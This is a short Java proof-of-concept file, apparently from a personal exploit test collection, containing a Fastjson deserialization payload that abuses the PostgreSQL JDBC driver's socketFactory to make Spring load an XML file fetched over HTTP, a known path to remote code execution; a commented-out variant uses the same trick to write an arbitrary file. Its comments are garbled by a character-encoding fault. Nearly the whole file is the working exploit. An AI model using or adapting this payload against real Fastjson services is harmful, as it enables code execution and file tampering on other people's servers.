package test;
import com.alibaba.fastjson.JSON;

public class Fastjson16_pgsql {
    public static void main(String[] args) throws Exception {
    	
        //<=1.2.68,����postgresql-42.3.1��spring����,�ο�Pgsql��jdbcΣ����
    	//h2 jar����Ȼû��-g���룬��˲��ÿ���h2��jdbc��
        String payload = "{\r\n"
        		+ "	\"@type\": \"java.lang.AutoCloseable\",\r\n"
        		+ "	\"@type\": \"org.postgresql.jdbc.PgConnection\",\r\n"
        		+ "	\"hostSpecs\": [{\r\n"
        		+ "		\"host\": \"127.0.0.1\",\r\n"
        		+ "		\"port\": 2333\r\n"
        		+ "	}],\r\n"
        		+ "	\"user\": \"test\",\r\n"
        		+ "	\"database\": \"test\",\r\n"
        		+ "	\"info\": {\r\n"
        		+ "		\"socketFactory\": \"org.springframework.context.support.ClassPathXmlApplicationContext\",\r\n"
        		+ "		\"socketFactoryArg\": \"http://127.0.0.1:81/test.xml\"\r\n"
        		+ "	},\r\n"
        		+ "	\"url\": \"\"\r\n"
        		+ "}";
//        payload = "{\r\n"
//        		+ "	\"@type\": \"java.lang.AutoCloseable\",\r\n"
//        		+ "	\"@type\": \"org.postgresql.jdbc.PgConnection\",\r\n"
//        		+ "	\"hostSpecs\": [{\r\n"
//        		+ "		\"host\": \"127.0.0.1\",\r\n"
//        		+ "		\"port\": 2333\r\n"
//        		+ "	}],\r\n"
//        		+ "	\"user\": \"test\",\r\n"
//        		+ "	\"database\": \"test\",\r\n"
//        		+ "	\"info\": {\r\n"
//        		+ "		\"socketFactory\": \"java.io.FileOutputStream\",\r\n"
//        		+ "		\"socketFactoryArg\": \"1.txt\"\r\n"
//        		+ "	},\r\n"
//        		+ "	\"url\": \"\"\r\n"
//        		+ "}";
        
        
        System.out.println(payload);
        JSON.parseObject(payload);	
    }
}
